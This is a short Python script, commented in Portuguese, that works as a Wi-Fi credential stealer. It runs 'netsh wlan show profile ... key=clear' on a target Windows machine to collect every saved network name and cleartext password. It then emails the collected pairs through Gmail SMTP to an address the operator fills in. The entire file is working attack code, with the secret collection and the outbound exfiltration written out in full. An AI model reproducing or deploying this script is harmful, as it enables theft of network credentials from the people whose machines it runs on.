import subprocess

login = []
senha = []

# Lista todos os wifis conectados no alvo
meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
data = (str(meta_data)).split('\\r\\n')

# Para cada wifi encontrado, filtra somente pelo nome e os inclui em uma lista
for line in data[9:]:
    nome = line[32:]
    login.append(nome)

login = list(filter(None,login))

# Para cada wifi encontrado, filtra a senha e as inclui em uma outra lista
for i in login:
    pass_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
    passwd = (str(pass_data)).split('\\r\\n')
    info = passwd[32]
    senha.append(info[38:])

senha = list(filter(None,senha))

# Geração de um dicionario com os logins e senhas encontrados
dic = dict(zip((login),senha))


import smtplib

# Realiza a conexão com o email através do smtp
try:
	msgFrom = "email@gmail.com"
	smtpObj = smtplib.SMTP('smtp.gmail.com',587)
	smtpObj.ehlo()
	smtpObj.starttls()
	msgTo = 'email@gmail.com'
	# Seguir esse tutorial para criação do token de conexão com o gmail: https://www.treinaweb.com.br/blog/enviando-email-com-python-e-smtp
	toPass = 'seu-token-criado'  
	smtpObj.login(msgTo, toPass)
	
    # Criamos o payload da mensagem com os dados do dicionario criado anteriormente
	msg = """
	%s
	""" % (str(dic))
	
    # Realizamos o envio dos dados para o e-mail escolhido
	smtpObj.sendmail(msgTo,msgFrom,'Subject: Dados-Login&Senha-Wifi\n{}'.format(msg))
	smtpObj.quit()
	print("Email enviado com sucesso!")
except:
	print("Erro ao enviar e-mail")